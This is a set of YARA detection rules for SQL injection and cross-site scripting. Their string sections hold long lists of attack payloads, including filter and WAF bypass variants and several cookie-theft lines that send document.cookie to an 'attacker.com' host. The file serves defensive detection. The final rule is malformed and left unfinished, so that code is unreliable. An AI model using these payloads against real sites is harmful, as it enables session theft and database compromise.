rule SQLi: mal
{
    meta:
        author = "Matthew Jang"
        maltype = "SQL Injection for MySQL, Oracle, SQL Server, etc."
        reference = "https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks"
        description = "YARA rule to detect the most common SQL injection commands/strings"

    strings:
        $char1 = "1=1"                        // 1=1 is always true
        $char2 = "--"                         // line comments
        $char3 = "#"
        $str1 = "CONCAT" nocase               // for MySQL
        $str2 = "CHAR" nocase
        $str3 = "Hex" nocase
        $str4 = "admin' --"                   // bypassing login screen
        $str5 = "admin' #"
        $str6 = "admin' /*"                   
        $str7 = "MD5" nocase
        $str8 = "HAVING" nocase 
        $str9 = "ORDER BY" nocase
        $str10 = "CAST" nocase
        $str11 = "CONVERT" nocase
        $str12 = "@@version"
        $str13 = "bcp" nocase
        $str14 = "VERSION" nocase
        $str15 = "WHERE" nocase
        $str16 = "LIMIT" nocase
        $str17 = "EXEC" nocase 
        $str18 = "';shutdown --"
        $str19 = "WAITFOR DELAY" nocase
        $str20 = "NOT EXIST" nocase
        $str21 = "NOT IN" nocase
        $str22 = "BENCHMARK" nocase
        $str23 = "pg_sleep"
        $str24 = "sleep"                      // for MySQL
        $str25 = "--sp_password" nocase
        $str26 = "SHA1" nocase
        $str27 = "PASSWORD" nocase
        $str28 = "ENCODE" nocase
        $str29 = "COMPRESS" nocase
        $str30 = "SCHEME" nocase
        $str31 = "ROW_COUNT" nocase
        $str32 = "DROP members--" nocase
        $str33 = "ASCII" nocase
        $str34 = "UNION" nocase
        $str35 = "UNION SELECT" nocase
        $str36 = "INFORMATION" nocase
        $str37 = "SCHEMA" nocase
        $str38 = "INFORMATION_SCHEMA" nocase 

    condition:
        any of ($char1, $char2, $char3) and
        any of ($str1, $str2, $str3, $str4, $str5, $str6, $str7, $str8, $str9, $str10, $str11, $str12, $str13, $str14, $str15, $str16, $str17, $str18, $str19, $str20, $str21, $str22, $str23, $str24, $str25, $str26, $str27, $str28, $str29, $str30, $str31, $str32, $str33, $str34, $str35, $str36, $str37, $str38)
}



rule xss_multiple_payload_detection {
    meta:
        description = "Detect XSS attacks with specific payloads"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadAllTheThings"
        date = "2024-04-24"

    strings:
        $xss_payload1 = "<>" nocase
        $xss_payload2 = "script" nocase
        $xss_payload3 = "\" =\"\" '></><script></script><svg onload\"=\"alertonload=test\"\" onload=prompt`xss`>" nocase
        $xss_payload4 = "<script>alert('XSS')</script>"
        $xss_payload5 = "<scr<script>ipt>alert('XSS')</scr<script>ipt>"
        $xss_payload6 = "\"> <script>alert('XSS')</script>"
        $xss_payload7 = "\"> <script>alert(String.fromCharCode(88,83,83))</script>"
        $xss_payload8 = "<script>\\u0061lert('22')</script>"
        $xss_payload9 = "<script>eval('\\x61lert(\\'33\\')')</script>"
        $xss_payload10 = "<script>eval(8680439..toString(30))(983801..toString(36))</script>"
        $xss_payload11 = "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">"
        $xss_image_payload1 = "<img src=x onerror=alert('XSS');>"
        $xss_image_payload2 = "<img src=x onerror=alert('XSS')//"
        $xss_image_payload3 = "<img src=x onerror=alert(String.fromCharCode(88,83,83));>"
        $xss_image_payload4 = "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>"
        $xss_image_payload5 = "<img src=x:alert(alt) onerror=eval(src) alt=xss>"
        $xss_image_payload6 = "\"> <img src=x onerror=alert('XSS');>"
        $xss_image_payload7 = "\"> <img src=x onerror=alert(String.fromCharCode(88,83,83));>"
        $xss_image_payload8 = "<><img src=1 onerror=alert(1)>"
        $xss_svg_payload1 = "<svgonload=alert(1)>"
        $xss_svg_payload2 = "<svg/onload=alert('XSS')>"
        $xss_svg_payload3 = "<svg onload=alert(1)//"
        $xss_svg_payload4 = "<svg/onload=alert(String.fromCharCode(88,83,83))>"
        $xss_svg_payload5 = "<svg id=alert(1) onload=eval(id)>"
        $xss_svg_payload6 = "\"> <svg/onload=alert(String.fromCharCode(88,83,83))>"
        $xss_svg_payload7 = "\"> <svg/onload=alert(/XSS/)>"
        $xss_svg_payload8 = "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)"
        $xss_svg_payload9 = "<svg><script>alert('33')"
        $xss_svg_payload10 = "<svg><script>alert&lpar;'33'&rpar;"

        $additional_payload1 = "<script>alert(123);</script>"
        $additional_payload2 = "<ScRipT>alert(\"XSS\");</ScRipT>"
        $additional_payload3 = "<script>alert(123)</script>"
        $additional_payload4 = "<script>alert(\"hellox worldss\");</script>"
        $additional_payload5 = "<script>alert(“XSS”)</script>"
        $additional_payload6 = "<script>alert(“XSS”);</script>"
        $additional_payload7 = "<script>alert(‘XSS’)</script>"
        $additional_payload8 = "\" ><script>alert(“XSS”)</script>"
        $additional_payload9 = "<script>alert(/XSS”)</script>"
        $additional_payload10 = "<script>alert(/XSS/)</script>"
        $additional_payload11 = "</script><script>alert(1)</script>"
        $additional_payload12 = "'; alert(1);"
        $additional_payload13 = "')alert(1);//"
        $additional_payload14 = "<ScRiPt>alert(1)</sCriPt>"
        $additional_payload15 = "<IMG SRC=jAVasCrIPt:alert(‘XSS’)>"
        $additional_payload16 = "<IMG SRC=”javascript:alert(‘XSS’);”>"
        $additional_payload17 = "<IMG SRC=javascript:alert(&quot;XSS&quot;)>"
        $additional_payload18 = "<IMG SRC=javascript:alert(‘XSS’)>"
        $additional_payload19 = "<img src=xss onerror=alert(1)>"

    condition:
        any of ($xss_payload*) or any of ($xss_image_payload*) or any of ($xss_svg_payload*) or any of ($additional_payload*)
}

rule detect_xss_payloads_bypass_with_condition_and_bypass_HTML5 {
    meta:
        description = "Detect various XSS payloads"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadAllTheThings"
        date = "2024-04-25"

    strings:
        $xss_payload1 = "<body onload=alert(/XSS/.source)>"
        $xss_payload2 = "<input autofocus onfocus=alert(1)>"
        $xss_payload3 = "<select autofocus onfocus=alert(1)>"
        $xss_payload4 = "<textarea autofocus onfocus=alert(1)>"
        $xss_payload5 = "<keygen autofocus onfocus=alert(1)>"
        $xss_payload6 = "<video/poster/onerror=alert(1)>"
        $xss_payload7 = "<video><source onerror=\"javascript:alert(1)\">"
        $xss_payload8 = "<video src=_ onloadstart=\"alert(1)\">"
        $xss_payload9 = "<details/open/ontoggle=\"alert`1`\">"
        $xss_payload10 = "<audio src onloadstart=alert(1)>"
        $xss_payload11 = "<marquee onstart=alert(1)>"
        $xss_payload12 = "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>"
        $xss_payload13 = "<body ontouchstart=alert(1)>"
        $xss_payload14 = "<body ontouchend=alert(1)>"
        $xss_payload15 = "<body ontouchmove=alert(1)>"

        $bypass_payload1 = "<sCrIpt>alert(1)</ScRipt>" nocase
        $bypass_payload2 = "<script x>" nocase
        $bypass_payload3 = "<script x>alert('XSS')"
        $bypass_payload4 = "eval('ale'+'rt(0)');" nocase
        $bypass_payload5 = "Function(\"ale\"+\"rt(1)\")();" nocase
        $bypass_payload6 = "new Function`al\\ert\\`6\\``;" nocase
        $bypass_payload7 = "setTimeout('ale'+'rt(2)');" nocase
        $bypass_payload8 = "setInterval('ale'+'rt(10)');" nocase
        $bypass_payload9 = "Set.constructor('ale'+'rt(13)')();" nocase
        $bypass_payload10 = "Set.constructor`al\\x65rt\\x2814\\x29```;" nocase
        $bypass_payload11 = "<script>window['alert'](document['domain'])</script>" nocase
        $bypass_payload12 = "<img/src='1'/onerror=alert(0)>" nocase

    condition:
        any of ($xss_payload*) or any of ($bypass_payload*)
}
rule XSS_Payload_1 {
    meta:
        description = "Detects <img> tag with onerror attribute containing alert payload"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadBox XSS"
    strings:
        $payload1 = /<img[^>]*src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload2 = /<image[^>]*src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
    condition:
        $payload1 or $payload2
}

rule XSS_Payload_2 {
    meta:
        description = "Detects <audio> tag with onerror attribute containing alert payload"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadBox XSS"
    strings:
        $payload = /<audio[^>]*src=[^>]*href=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
    condition:
        $payload
}

rule XSS_Payload_3 {
    meta:
        description = "Detects <video> tag with onerror attribute containing alert payload"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadBox XSS"
    strings:
        $payload = /<video[^>]*src=[^>]*href=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
    condition:
        $payload
}

rule XSS_Payload_4 {
    meta:
        description = "Detects <body> tag with onerror attribute containing alert payload"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadBox XSS"
    strings:
        $payload = /<body[^>]*src=[^>]*href=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
    condition:
        $payload
}

rule XSS_Payload_5 {
    meta:
        description = "Detects <a> tag with href attribute containing javascript:alert payload"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadBox XSS"
    strings:
        $payload = /<a[^>]*href=["']javascript\\x3Aalert\(1\)["'][^>]*>/
    condition:
        $payload
}

rule XSS_Payload_6 {
    meta:
        description = "Detects <p><svg><script> sequence with alert payload"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadBox XSS"
    strings:
        $payload = /<\/p><svg><script>[^<]*alert\(1\)/
    condition:
        $payload
}

rule XSS_Payload_7 {
    meta:
        description = "Detects <a> tag with various hexadecimal representations of javascript:alert payload"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "PayloadBox XSS"
    strings:
        $payload1 = /<a[^>]*href=["']javas\\x00cript:alert\(1\)["'][^>]*>/
        $payload2 = /<a[^>]*href=["']javas\\x07cript:alert\(1\)["'][^>]*>/
        $payload3 = /<a[^>]*href=["']javas\\x0Dcript:alert\(1\)["'][^>]*>/
        $payload4 = /<a[^>]*href=["']javas\\x0Acript:alert\(1\)["'][^>]*>/
        $payload5 = /<a[^>]*href=["']javas\\x08cript:alert\(1\)["'][^>]*>/
        $payload6 = /<a[^>]*href=["']javas\\x02cript:alert\(1\)["'][^>]*>/
        $payload7 = /<a[^>]*href=["']javas\\x03cript:alert\(1\)["'][^>]*>/
        $payload8 = /<a[^>]*href=["']javas\\x04cript:alert\(1\)["'][^>]*>/
        $payload9 = /<a[^>]*href=["']javas\\x01cript:alert\(1\)["'][^>]*>/
        $payload10 = /<a[^>]*href=["']javas\\x05cript:alert\(1\)["'][^>]*>/
        $payload11 = /<a[^>]*href=["']javas\\x0Bcript:alert\(1\)["'][^>]*>/
        $payload12 = /<a[^>]*href=["']javas\\x09cript:alert\(1\)["'][^>]*>/
        $payload13 = /<a[^>]*href=["']javas\\x06cript:alert\(1\)["'][^>]*>/
        $payload14 = /<a[^>]*href=["']javas\\x0Ccript:alert\(1\)["'][^>]*>/
    condition:
        any of ($payload*)
}

rule XSS_Payload_8 {
    meta:
        description = "Detects <img> tag with various hexadecimal representations of onerror alert payload"
        reference = "PayloadBox XSS"
    strings:
        $payload1 = /<img[^>]*\\x00src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload2 = /<img[^>]*\\x47src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload3 = /<img[^>]*\\x11src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload4 = /<img[^>]*\\x12src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload5 = /<img[^>]*\\x13src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload6 = /<img[^>]*\\x32src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload7 = /<img[^>]*\\x10src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload8 = /<img[^>]*\\x34src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload9 = /<img[^>]*\\x39src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload10 = /<img[^>]*src\\x09=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload11 = /<img[^>]*src\\x10=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload12 = /<img[^>]*src\\x11=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload13 = /<img[^>]*src\\x12=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
        $payload14 = /<img[^>]*src\\x13=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
    condition:
        any of ($payload*)
}
rule XSS_CSP_WAF_Bypass {
    meta:
        description = "Detects XSS attack payloads designed to bypass CSP and WAF protections"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "None"
        
    strings:
        $payload1 = "<img src=x onerror=\"window \">"
        $payload2 = "<svg><script> </script></svg>"
        $payload3 = "<iframe srcdoc=\"<script>ale`rt(1)</script>\"></iframe>"
        $payload4 = "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"
        $payload5 = "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>"
        $payload6 = "<img src=x onerror=\"fetch('http://attacker.com?c='+document.cookie)\">"
        $payload7 = "<meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\"><script src='data:text/javascript,alert(1)'></script>"
        $payload8 = "<svg/onload=import('data:text/javascript,alert(1))>"
        $payload9 = "<img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>"
        $payload10 = "<link rel='preload' href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' as='script' onload='this.rel=\"stylesheet\"'>"
        $payload11 = "<style>@import url('data:text/css,@import%20%22javascript:alert(1)%22;');</style>"
        $payload12 = "<img src='x' onerror='fetch(\"https://attacker.com?\"+document.cookie)'>"
        $payload13 = "<input type='text' value='<img src=x onerror=alert(1)>'>"
        $payload14 = "<body onload='fetch(\"https://attacker.com?\"+document.cookie)'>"
        $payload15 = "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>"
        $payload16 = "<svg/onload='this.outerHTML=`<script>alert(1)</script>`'>"
        $payload17 = "<img src='javascript:alert(1)'>"
        $payload18 = "<form action='javascript:alert(1)'><input type='submit'></form>"
        $payload19 = "<iframe src=\"data:text/html,<script>alert('XSS')\"></iframe>"
        $payload20 = "<script src='data:text/javascript,alert(1)'></script>"
        $payload21 = "<video><source onerror='javascript:alert(1)'></video>"
        $payload22 = "<img src=x onerror=this.onerror=window.onerror=alert(1)>"
        $payload23 = "<img src=x onerror=alert`1`>"
        $payload24 = "<img src=x onerror=alert(/1/)>"
        $payload25 = "<input autofocus onfocus=alert(1)>"
        $payload26 = "<input onblur=alert(1) autofocus>"
        $payload27 = "<script>location='java'+'script:alert(1)'</script>"
        $payload28 = "<meta content=\"0;url=javascript:alert(1);\" http-equiv=refresh>"
        $payload29 = "<a href=javascript:alert(1)>Click</a>"
        $payload30 = "<audio src onerror=alert(1)>"
        $payload31 = "<video src onerror=alert(1)>"
        $payload32 = "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">"
        $payload33 = "<object data='data:text/html,<script>alert(1)</script>'></object>"
        $payload34 = "<embed src='data:text/html,<script>alert(1)</script>'></embed>"
        $payload35 = "<img src=x onerror=alert`1`>"
        $payload36 = "<img src=x onerror=alert&lpar;1&rpar;>"
        $payload37 = "<img src=x onerror=alert&lpar;1&rpar;/>"
        $payload38 = "<img src=x onerror='alert&lpar;1&rpar;'>"
        $payload39 = "<iframe src=\"data:text/html;charset=utf-7,<script>alert(1)</script>\"></iframe>"
        $payload40 = "<svg><script>eval(\"al\"+\"ert(1)\")</script></svg>"
        $payload41 = "<form><button formaction='javascript:alert(1)'>X</button></form>"
        $payload42 = "<iframe src=\"data:text/html,<svg xmlns=%22http://www.w3.org/2000/svg%22 onload=%22javascript:alert(1)%22>\"></iframe>"
        $payload43 = "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"javascript:alert(1)\">"
        $payload44 = "<marquee width=1 loop=1 onfinish=javascript:alert(1)>"
        $payload45 = "<math><mtext></mtext><script>alert(1)</script></math>"

    condition:
        any of ($payload*)
}
rule XSS_Attacks
{
    meta:
        description = "Detects XSS attack payloads from payloadbox XSS payload list"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "None"
        
    strings:
        // Previous payloads
        $payload1 = "<svg/onload=alert(1)>"
        $payload2 = "<body/onload=alert(1)>"
        $payload3 = "<iframe src=javascript:alert(1)>"
        $payload4 = "<input type=image src=javascript:alert(1)>"
        $payload5 = "<form><button formaction=javascript:alert(1)>Click me</button></form>"
        $payload6 = "<a href=javascript:alert(1)>Click me</a>"
        $payload7 = "<img src=x onerror=alert(1)>"
        $payload8 = "<link rel=stylesheet href=javascript:alert(1)>"
        $payload9 = "<meta http-equiv=refresh content=0;url=javascript:alert(1)>"
        $payload10 = "<object data=javascript:alert(1)>"
        $payload11 = "<script>alert(1)</script>"
        $payload12 = "<embed src=javascript:alert(1)>"
        $payload13 = "<details open ontoggle=alert(1)>"
        $payload14 = "<marquee onstart=alert(1)>"
        $payload15 = "<math><mtext></mtext><a xlink:href=javascript:alert(1)>Click me</a></math>"
        $payload16 = "<isindex action=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>"
        $payload17 = "<svg/onload=prompt(1)>"
        $payload18 = "<img src='javascript:alert(1)'>"
        $payload19 = "<script src='http://example.com/xss.js'></script>"
        $payload20 = "<img src='http://example.com/xss.svg' onload='alert(1)'>"
        $payload21 = "<bgsound src='javascript:alert(1)'>"
        $payload22 = "<style>@import 'javascript:alert(1)';</style>"
        $payload23 = "<frame src='javascript:alert(1)'>"
        $payload24 = "<layer src='http://example.com/xss.js'></layer>"
        $payload25 = "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
        $payload26 = "<object data='javascript:alert(1)'>"
        $payload27 = "<applet code='javascript:alert(1)'></applet>"
        $payload28 = "<base href='javascript:alert(1)//'>"
        $payload29 = "<bgsound src='javascript:alert(1)'>"
        $payload30 = "<blink>Click <a href='javascript:alert(1)'>here</a></blink>"
        $payload31 = "<comment><img src='x' onerror='alert(1)'></comment>"
        $payload32 = "<iframe src='javascript:alert(1)'></iframe>"
        $payload33 = "<img src='javascript:alert(1)'/>"
        $payload34 = "<link href='javascript:alert(1)'>"
        $payload35 = "<style>.x{background-image:url(javascript:alert(1))}</style>"

    condition:
        any of ($payload*)
}

rule Detect_XSS_Payloads
{
    meta:
        description = "Detects XSS attack payloads from payloadbox XSS payload list"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "Payloadbox xss"

    strings:
        $prompt1 = "-prompt(8)-"
        $prompt2 = "'-prompt(8)-'"
        $prompt3 = ";a=prompt,a()//"
        $prompt4 = "';a=prompt,a()//"
        $eval1 = "'-eval(\"window \")-'"
        $eval2 = "\"-eval(\"window \")-\""
        
        $onclick1 = "\"onclick=prompt(8)>\""
        $onclick2 = "\"onclick=prompt(8)><svg/onload=prompt(8)>\""
        $onerror1 = "<image/src/onerror=prompt(8)>"
        $onerror2 = "<img/src/onerror=prompt(8)>"
        $onerror3 = "<image src/onerror=prompt(8)>"
        $onerror4 = "<img src/onerror=prompt(8)>"
        $onerror5 = "<image src =q onerror=prompt(8)>"
        $onerror6 = "<img src =q onerror=prompt(8)>"
        $onerror7 = "</scrip</script>t><img src =q onerror=prompt(8)>"
        
        $script1 = "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>"
        $script2 = "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>"
        $script3 = "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>"
        $script4 = "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>"
        $script5 = "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>"
        $script6 = "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>"
        $script7 = "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>"
        $script8 = "'\"><\\x3Cscript>javascript:alert(1)</script>"
        $script9 = "'\"><\\x00script>javascript:alert(1)</script>"

        $onerror_img1 = "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>"
        $onerror_audio1 = "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>"
        $onerror_video1 = "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>"
        $onerror_body1 = "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>"
        $onerror_image1 = "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>"
        $onerror_object1 = "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>"
        $onerror_script1 = "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>"

        $onevent1 = "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>"
        $onevent2 = "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>"
        $onevent3 = "<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>"
        $onevent4 = "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>"
        $onevent5 = "<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>"
        $onevent6 = "<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>"
        $onevent7 = "<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>"
        $onevent8 = "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>"
        $onevent9 = "<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>"
        $onevent10 = "<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>"
        $onevent11 = "<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>"
        $onevent12 = "<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>"
        $onevent13 = "<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>"
        $onevent14 = "<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>"
        $onevent15 = "<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>"
        $onevent16 = "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>"
        $onevent17 = "<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>"
        $onevent18 = "<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>"
        $onevent19 = "<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>"
        $onevent20 = "<body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"></body onPageShow>"
        $onevent21 = "<style onReadyStateChange style onReadyStateChange=\"javascript:javascript:alert(1)\"></style onReadyStateChange>"
        $onevent22 = "<frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"></frameset onFocus>"
        $onevent23 = "<applet onError applet onError=\"javascript:javascript:alert(1)\"></applet onError>"
        $onevent24 = "<marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"></marquee onStart>"
        $onevent25 = "<script onLoad script onLoad=\"javascript:javascript:alert(1)\"></script onLoad>"
        $onevent26 = "<html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"></html onMouseOver>"
        $onevent27 = "<html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"></html onMouseEnter>"
        $onevent28 = "<body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"></body onBeforeUnload>"
        $onevent29 = "<html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"></html onMouseDown>"
        $onevent30 = "<marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"></marquee onScroll>"
        $onevent31 = "<xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"></xml onPropertyChange>"
        $onevent32 = "<frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"></frameset onBlur>"
        $onevent33 = "<applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"></applet onReadyStateChange>"
        $onevent34 = "<svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"></svg onUnload>"
        $onevent35 = "<html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"></html onMouseOut>"
        $onevent36 = "<body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"></body onMouseMove>"
        $onevent37 = "<body onResize body onResize=\"javascript:javascript:alert(1)\"></body onResize>"
        $onevent38 = "<object onError object onError=\"javascript:javascript:alert(1)\"></object onError>"
        $onevent39 = "<body onPopState body onPopState=\"javascript:javascript:alert(1)\"></body onPopState>"
        $onevent40 = "<html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"></html onMouseMove>"
        $onevent41 = "<applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"></applet onreadystatechange>"
        $onevent42 = "<body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"></body onpagehide>"
        $onevent43 = "<svg onunload svg onunload=\"javascript:javascript:alert(1)\"></svg onunload>"
        $onevent44 = "<applet onerror applet onerror=\"javascript:javascript:alert(1)\"></applet onerror>"
        $onevent45 = "<body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"></body onkeyup>"
        $onevent46 = "<body onunload body onunload=\"javascript:javascript:alert(1)\"></body onunload>"
        $onevent47 = "<iframe onload iframe onload=\"javascript:javascript:alert(1)\"></iframe onload>"
        $onevent48 = "<body onload body onload=\"javascript:javascript:alert(1)\"></body onload>"
        $onevent49 = "<html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"></html onmouseover>"
        $onevent50 = "<object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"></object onbeforeload>"
        $onevent51 = "<body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"></body onbeforeunload>"
        $onevent52 = "<body onfocus body onfocus=\"javascript:javascript:alert(1)\"></body onfocus>"
        $onevent53 = "<html onmouseup html onmouseup=\"javascript:javascript:alert(1)\"></html onmouseup>"
        $onevent54 = "<body onmouseleave body onmouseleave=\"javascript:javascript:alert(1)\"></body onmouseleave>"
        $onevent55 = "<body onpageshow body onpageshow=\"javascript:javascript:alert(1)\"></body onpageshow>"
        $onevent56 = "<frameset onblur frameset onblur=\"javascript:javascript:alert(1)\"></frameset onblur>"
        $onevent57 = "<html onmouseleave html onmouseleave=\"javascript:javascript:alert(1)\"></html onmouseleave>"
        $onevent58 = "<frameset onreadystatechange frameset onreadystatechange=\"javascript:javascript:alert(1)\"></frameset onreadystatechange>"
        $onevent59 = "<body onpopstate body onpopstate=\"javascript:javascript:alert(1)\"></body onpopstate>"
        $onevent60 = "<body onmousemove body onmousemove=\"javascript:javascript:alert(1)\"></body onmousemove>"
        $onevent61 = "<html onmouseenter html onmouseenter=\"javascript:javascript:alert(1)\"></html onmouseenter>"
        $onevent62 = "<html onmousewheel html onmousewheel=\"javascript:javascript:alert(1)\"></html onmousewheel>"
        $onevent63 = "<frameset onload frameset onload=\"javascript:javascript:alert(1)\"></frameset onload>"
        $onevent64 = "<body onmouseup body onmouseup=\"javascript:javascript:alert(1)\"></body onmouseup>"
        $onevent65 = "<iframe onreadystatechange iframe onreadystatechange=\"javascript:javascript:alert(1)\"></iframe onreadystatechange>"
        $onevent66 = "<body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"></body onkeydown>"
        $onevent67 = "<html onfocus html onfocus=\"javascript:javascript:alert(1)\"></html onfocus>"
        $onevent68 = "<body onblur body onblur=\"javascript:javascript:alert(1)\"></body onblur>"
        $onevent69 = "<html onmousedrop html onmousedrop=\"javascript:javascript:alert(1)\"></html onmousedrop>"
        $onevent70 = "<iframe onbeforerequest iframe onbeforerequest=\"javascript:javascript:alert(1)\"></iframe onbeforerequest>"

        $payload1 = "<img \x00src=x onerror="alert(1)">"
        $payload2 = "<img \x47src=x onerror="javascript:alert(1)">"
        $payload3 = "<img \x12src=x onerror="javascript:alert(1)">"
        $payload4 = "<img\x47src=x onerror="javascript:alert(1)">"
        $payload5 = "<img\x10src=x onerror="javascript:alert(1)">"
        $payload6 = "<img\x13src=x onerror="javascript:alert(1)">"
        $payload7 = "<img\x32src=x onerror="javascript:alert(1)">"
        $payload8 = "<img\x47src=x onerror="javascript:alert(1)">"
        $paylaod9 = "<img\x11src=x onerror="javascript:alert(1)">"
        $payload10 = "<img \x47src=x onerror="javascript:alert(1)">"
        $payload11 = "<img \x34src=x onerror="javascript:alert(1)">"
        $payload12 = "<img \x39src=x onerror="javascript:alert(1)">"
        $payload13 = "<img \x00src=x onerror="javascript:alert(1)">"
        $payload14 = "<img src\x09=x onerror="javascript:alert(1)">"
        $payload15 = "<img src\x10=x onerror="javascript:alert(1)">"
        $payload16 = "<img src\x13=x onerror="javascript:alert(1)">"
        $payload17 = "<img src\x32=x onerror="javascript:alert(1)">"
        $payload18 = "<img src\x12=x onerror="javascript:alert(1)">""
        $payload19 = "<img src\x11=x onerror="javascript:alert(1)">"
